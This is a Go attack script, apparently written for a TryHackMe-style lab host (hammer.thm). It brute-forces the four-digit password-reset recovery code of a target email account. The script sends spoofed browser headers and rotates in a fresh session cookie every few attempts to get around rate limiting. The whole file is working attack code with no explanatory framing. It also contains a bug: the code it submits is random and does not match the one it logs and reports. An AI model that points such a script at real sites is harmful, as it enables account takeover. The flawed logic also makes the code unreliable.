package main

import (
	"compress/gzip"
	crand "crypto/rand"
	"encoding/hex"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"strings"
	"time"
)

const (
	passwordResetURL  = "http://hammer.thm:1337/reset_password.php"
	targetEmail       = "teset@hammer.thm"
	maxAttempts       = 50
	attemptsPerSession = 8
)

var (
	headers = map[string]string{
		"User-Agent":                "Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0",
		"Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"Accept-Language":           "en-US,en;q=0.5",
		"Accept-Encoding":           "gzip, deflate, br",
		"Content-Type":              "application/x-www-form-urlencoded",
		"Origin":                    "http://hammer.thm:1337",
		"Connection":                "close",
		"Referer":                   "http://hammer.thm:1337/reset_password.php",
		"Upgrade-Insecure-Requests": "1",
	}

	emailData = url.Values{"email": {targetEmail}}
)

func createSession() *http.Client {
	jar, _ := cookiejar.New(nil)
	return &http.Client{
		Jar: jar,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			log.Printf("Following redirect to: %s", req.URL)
			return nil
		},
	}
}

func generatePHPsession() string {
	bytes := make([]byte, 16)
	if _, err := crand.Read(bytes); err != nil {
		log.Fatal("Session ID generation failed:", err)
	}
	return hex.EncodeToString(bytes)
}

func readResponseBody(resp *http.Response) string {
	var reader io.Reader
	switch resp.Header.Get("Content-Encoding") {
	case "gzip":
		gzReader, err := gzip.NewReader(resp.Body)
		if err != nil {
			log.Fatal("GZIP decompression failed:", err)
		}
		defer gzReader.Close()
		reader = gzReader
	default:
		reader = resp.Body
	}

	body, err := io.ReadAll(reader)
	if err != nil {
		log.Fatal("Failed to read response:", err)
	}
	return string(body)
}

func sendToken(session *http.Client) bool {
	req, _ := http.NewRequest("POST", passwordResetURL, strings.NewReader(emailData.Encode()))
	for k, v := range headers {
		req.Header.Add(k, v)
	}

	resp, err := session.Do(req)
	if err != nil {
		log.Fatal("Email submission failed:", err)
	}
	defer resp.Body.Close()

	body := readResponseBody(resp)
	return strings.Contains(body, "Enter Recovery Code")
}

func tryCode(session *http.Client, code string) bool {
	data := url.Values{
		"recovery_code": {fmt.Sprintf("%04d", rand.Int31n(10000))},
		"s":             {"177"},
	}

	req, _ := http.NewRequest("POST", passwordResetURL, strings.NewReader(data.Encode()))
	for k, v := range headers {
		req.Header.Add(k, v)
	}

	resp, err := session.Do(req)
	if err != nil {
		log.Fatal("Code submission failed:", err)
	}
	defer resp.Body.Close()

	body := readResponseBody(resp)
	return !strings.Contains(body, "Invalid or expired recovery code!")
}

func tryUntilSuccess() (bool, string) {
	session := createSession()
	
	u, _ := url.Parse(passwordResetURL)
	session.Jar.SetCookies(u, []*http.Cookie{
		{Name: "PHPSESSIONID", Value: generatePHPsession()},
	})

	if !sendToken(session) {
		return false, ""
	}

	for i := 0; i < attemptsPerSession; i++ {
		code := fmt.Sprintf("%04d", i)
		log.Printf("Attempt %d: Trying code %s", i+1, code)
		if success := tryCode(session, code); success {
			return true, code
		}
	}
	return false, ""
}

func main() {
	rand.Seed(time.Now().UnixNano())
	var foundToken string
	var success bool

	for attempt := 1; attempt <= maxAttempts; attempt++ {
		log.Printf("Starting attempt %d/%d", attempt, maxAttempts)
		success, foundToken = tryUntilSuccess()
		if success {
			break
		}
	}

	if success {
		log.Printf("SUCCESS! Valid token: %s", foundToken)
	} else {
		log.Println("Failed to find valid token after maximum attempts")
	}
}
